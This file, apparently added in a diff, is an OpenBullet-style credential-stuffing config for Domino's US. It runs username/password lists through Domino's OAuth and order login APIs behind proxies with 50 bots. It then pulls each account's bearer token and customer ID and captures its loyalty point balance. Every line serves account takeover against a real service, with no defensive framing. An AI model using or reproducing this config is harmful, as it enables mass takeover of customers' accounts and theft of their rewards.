@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "Dominos US",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-31T20:11:20.3778416+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN REQUEST POST "https://api.dominos.com/as/token.oauth2" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Origin: https://api.dominos.com" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: bm9sby1ybTo=" 
+#PARSE_AUTHORIZATION_BEARER PARSE "<SOURCE>" LR "{\"access_token\":\"" "\"" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#PARSE_XDPZD PARSE "<HEADERS(X-DPZ-D)>" LR "" "" Recursive=FALSE -> VAR "XDPZD" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error_description" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+#GET_DATA REQUEST POST "https://order.dominos.com/power/login" AutoRedirect=TRUE 
+  CONTENT "loyaltyIsActive=true&rememberMe=false&u=<USER>&p=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "Origin: https://order.dominos.com" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "Referer: https://order.dominos.com/en/assets/build/xdomain/proxy.html" 
+  HEADER "X-DPZ-D: <XDPZD>" 
+#PARSE_CID PARSE "<SOURCE>" LR "\"CustomerID\":\"" "\"" Recursive=FALSE -> VAR "CUSTOMERID" "" "" 
+#REQUEST_POINTS_PAGE REQUEST GET "https://order.dominos.com/power/customer/<CUSTOMERID>/loyalty?_=1535747732519" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "X-DPZ-D: <XDPZD>~" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+  HEADER "Market: UNITED_STATES" 
+  HEADER "DPZ-Market: UNITED_STATES" 
+  HEADER "DPZ-Language: en" 
+  HEADER "Referer: https://order.dominos.com/en/assets/build/xdomain/proxy.html" 
+#PARSE_POINTS PARSE "<SOURCE>" JSON "VestedPointBalance" Recursive=FALSE -> VAR "FILTER" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<FILTER>" EqualTo "0" 
+#PARSE_POINTS PARSE "<SOURCE>" JSON "VestedPointBalance" Recursive=FALSE -> CAP "POINTS" "" "" 
